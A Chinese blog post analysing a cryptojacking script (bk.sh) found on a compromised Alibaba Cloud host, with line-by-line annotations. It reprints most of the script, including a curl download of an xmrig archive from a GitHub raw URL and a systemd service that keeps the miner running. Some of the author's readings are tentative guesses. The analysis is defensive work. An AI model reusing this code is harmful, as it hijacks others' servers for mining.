# 记上次黑客入侵阿里云主机，并分析其代码行为。

已将问题反馈到阿里云安全团队客服，并向阿里云中心举报其地址。接下来是代码分析。(bk.sh)


## bk.sh，推测是靶机脚本(if及json部分)

### 第一层 if

参考信息源：

* [百度知道-Linux shell 脚本 $(id -u) 是什么意思？](https://zhidao.baidu.com/question/944658594109817212.html)
* [bbsmax-shell if判断中常用的a-z表达式含义](https://www.bbsmax.com/A/8Bz81Qa6Jx/)
* [linux 环境变量设置 -d,Linux环境变量的设置](https://blog.csdn.net/weixin_35565522/article/details/116774198)
* [Shell中的exit 0 和 exit 1是做什么的?](https://www.pianshen.com/article/37962128580/)
* [博客园-shell中的type命令](https://www.cnblogs.com/chaoguo1234/p/5723531.html)
* [Linux /dev/null详解](https://www.shuzhiduo.com/A/6pdDP9ALdw/)


```
#-----
# 判断是不是root权限
if [ "$(id -u)" == "0" ]; then
  echo ""
fi
#----
# 这部分是判断环境配置准备

# “-z 长度为零则为真”，做一个逆向判断，就是找不到这个目录，打印"请将home环境定义到主目录"。 
if [ -z $HOME ]; then
  echo "ERROR: Please define HOME environment variable to your home directory"
# 异常退出，debug检测的。
  exit 1
fi
# 检查是否有家目录，没有则提示导入，引入家目录环境变量
if [ ! -d $HOME ]; then
  echo "ERROR: Please make sure HOME directory $HOME exists or set it yourself using this command:"
  echo 'export HOME=<dir>'
  exit 1
fi

# 找不到curl命令定义，则丢入黑洞，跳出
if ! type curl >/dev/null; then
  echo "ERROR: This script requires \"curl\" utility to work correctly"
  exit 1
fi

# `sudo -n true 2`返回“一个密码请求”的定义信息
# if ! sudo -n true 2>/dev/null; then
#  if ! pidof systemd >/dev/null; then
#    echo "ERROR: This script requires systemd to work correctly"
#    exit 1
#  fi
# 看起来是调用（CPU几个核心数*7/10），如果为0，跳出。
CPU_THREADS=$(nproc)
EXP_MONERO_HASHRATE=$(( CPU_THREADS * 700 / 1000))
if [ -z $EXP_MONERO_HASHRATE ]; then
  echo "ERROR: Can't compute projected Monero CN hashrate"
  exit 1
fi
```

以上这echo所打印的报错信息，基本也说明主机不能正常使用，这对他们黑客而言，已经没有任何价值了。如果这些正常的话，则运行下载好的挖矿脚本，以及其专用的挖矿程序。然后又是层层的if环境检验。

### 第二层 if

参考信息源：

* [入门小站-linux之curl命令](https://zhuanlan.zhihu.com/p/519406107)
* [sed -i 命令入门详解](https://blog.csdn.net/h4241778/article/details/125263518)
* [XMR恶意挖矿案例简析](https://www.sohu.com/a/260504074_354899)
* [诱捕黑客的蜜罐系统](https://baijiahao.baidu.com/s?id=1706341262655959831)
* [linux应用之test命令详细解析](https://www.cnblogs.com/tankblog/p/6160808.html)
* [Shell脚本中$0、$?、$!、$$、$*、$#、$@等的意义以及linux命令执行返回值代表意义](https://blog.csdn.net/helloxiaozhe/article/details/80940066)


```
# curl -L --progress-bar 显示网页内容与进度条，存在异常则直接中断退出。
if ! curl -L --progress-bar "https://ghproxy.com/https://raw.githubusercontent.com/Tremblae/Tremble/main/xmrig.tar.gz" -o /tmp/xmrig.tar.gz; then
  echo "ERROR: Can't download https://ghproxy.com/https://raw.githubusercontent.com/Tremblae/Tremble/main/xmrig.tar.gz file to /tmp/xmrig.tar.gz"
  echo ""
  exit 1
fi

#  不能正常解压缩，退出删除文件
if ! tar xf /tmp/xmrig.tar.gz -C $HOME/c3pool --strip=1; then
    echo ""
	echo ""
  fi
  rm /tmp/xmrig.tar.gz

# 使用正则，看上去是为了替换掉原有的config.json的donate-level的数值。
  sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/c3pool/config.json
  $HOME/c3pool/xmrig --help >/dev/null
  # $? 最后命令的退出状态的返回值。0表示没有错误，其他任何值表明有错误。
  #   # 比较，不等于0，再检验下xmrig还是不是文件，是就打印换行，否则跳出。
  if (test $? -ne 0); then 
    if [ -f $HOME/c3pool/xmrig ]; then
      echo ""
	  echo ""
    else 
      echo ""
	  echo ""
    fi
    exit 1
  fi
fi
```

### 推测其意，做环境判断之后，用正则配置json

参考信息源：

* [百度知道-Linux下面这条命令能逐个解释一下吗:cat /etc/passwd |cut -f 1 -d ](https://zhidao.baidu.com/question/555970944.html)
* [博客园-Linux命令之cut](https://www.cnblogs.com/zhoujingyu/p/4948051.html)
* [csdn-linux中的sed参数,sed一些参数的用法](https://blog.csdn.net/weixin_39891317/article/details/116855981)
* [linux 抽取ip地址,Linux bash脚本提取IP地址](https://blog.csdn.net/weixin_36371924/article/details/116767805)
* [linux中awk命令详解(最全面秒懂）](https://www.cnblogs.com/zhengyan6/p/16290156.html)

指令逐条解释

* `hostname | cut -f1 -d"."` 将hostname的输出结果，传递给cut，以“.”切割分段行显示
* `sed -r 's/[^a-zA-Z0-9\-]+/_/g'` 删除所有特殊字符(除了数字以及大小写字母)。
* `ip route get 1` 返回路由条目，包括IP、网关、uid。
* `awk '{print $NF;exit}'` 对内容空格分段。

```
PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
if [ "$PASS" == "localhost" ]; then
# 测试这条命令输出为0
  PASS=`ip route get 1 | awk '{print $NF;exit}'`
fi
# 推测是配置json账户信息
if [ -z $PASS ]; then
  PASS=na
fi
if [ ! -z $EMAIL ]; then
  PASS="$PASS:$EMAIL"
fi
```

将json拷贝一份，作为后台文件，再用sed配置成后台运行。

```
cp $HOME/c3pool/config.json $HOME/c3pool/config_background.json
sed -i 's/"background": *false,/"background": true,/' $HOME/c3pool/config_background.json
```


## `cat >/tmp/c3pool_miner.service <<EOL` 注入设置脚本后台启动等

#### EOL注入脚本文件

参考信息源：

* [知乎专栏-heredoc入门](https://zhuanlan.zhihu.com/p/93993398)
* [linux265-pidof命令](https://linux265.com/course/linux-command-pidof.html)
* [linux265-nice命令](https://linux265.com/course/linux-command-nice.html)

`<<EOL EOL`创建与书写任意格式文本及代码。`pidof xxx`为查看xxx程序的进程号。nice命令调度进程的优先级，根据教程资料来看，黑客的代码语法还有些问题。

```
cat >$HOME/c3pool/miner.sh <<EOL
#!/bin/bash
if ! pidof xmrig >/dev/null; then
  nice $HOME/c3pool/xmrig \$*
else
  echo ""
fi
EOL
```

### service内容解读


```
  if ! type systemctl >/dev/null; then

    echo ""
	echo ""
    /bin/bash $HOME/c3pool/miner.sh --config=$HOME/c3pool/config_background.json >/dev/null 2>&1
    echo "ERROR: This script requires \"systemctl\" systemd utility to work correctly."
    echo "Please move to a more modern Linux distribution or setup miner activation after reboot yourself if possible."

  else

    echo "[*] Creating c3pool_miner systemd service"
    cat >/tmp/c3pool_miner.service <<EOL
[Unit]
Description=Monero miner service

[Service]
ExecStart=$HOME/c3pool/xmrig --config=$HOME/c3pool/config.json
Restart=always
Nice=10
CPUWeight=1

[Install]
WantedBy=multi-user.target
EOL
    sudo mv /tmp/c3pool_miner.service /etc/systemd/system/c3pool_miner.service
    echo ""
	echo ""
    sudo killall xmrig 2>/dev/null
    sudo systemctl daemon-reload
    sudo systemctl enable c3pool_miner.service
    sudo systemctl start c3pool_miner.service
    echo "To see miner service logs run \"sudo journalctl -u c3pool_miner -f\" command"
	echo ""
  fi
```

## “echo”及“#”打印及注释信息收集

### echo

"echo"部分为英语，我用翻译及个人有限功底理解其代码。第一行，中二教言语，忽略；从第二行开始翻译解读。

```
# 这部分是配置准备，以及调试
## 请将home环境定义到主目录。 
echo "ERROR: Please define HOME environment variable to your home directory"
## 请确保home环境已设置 
echo "ERROR: Please make sure HOME directory $HOME exists or set it yourself using this command:"

# 从这行的上部分代码推测实在挖矿了， 无法计算比特币什么的
## 错误：无法计算预计的门罗币 CN 哈希率 
echo "ERROR: Can't compute projected Monero CN hashrate"
## 报错，无法计算端口，输出错误端口
echo "ERROR: Can't compute port"
echo "ERROR: Wrong computed port value: $PORT"

# 进一步的恶意操控挖矿
## 下载与后台运行Monero CPU矿机/主机
echo "I will download, setup and run in background Monero CPU miner."
## 如果需要，前台的矿工可以通过$HOME/c3pool/miner.sh脚本启动。 
echo "If needed, miner in foreground can be started by $HOME/c3pool/miner.sh script."
# 挖矿将发生在 $WALLET 钱包上。这句话打印出来，就说明之前所有暗箱操作全完成了。
echo "Mining will happen to $WALLET wallet."
# 删掉挖矿的目录
echo "[*] Removing $HOME/c3pool directory"
```

### “#”（全部为机翻）

打印问候语；命令行参数；检查先决条件

```
# printing greetings
# command line arguments
# checking prerequisites
```

计算端口；印刷的意图；开始做事：准备矿工

```
# calculating port
# printing intentions
# start doing stuff: preparing miner
```

准备脚本

```
# preparing script
```

准备脚本背景工作和重启下的工作

```
# preparing script background work and work under reboot
```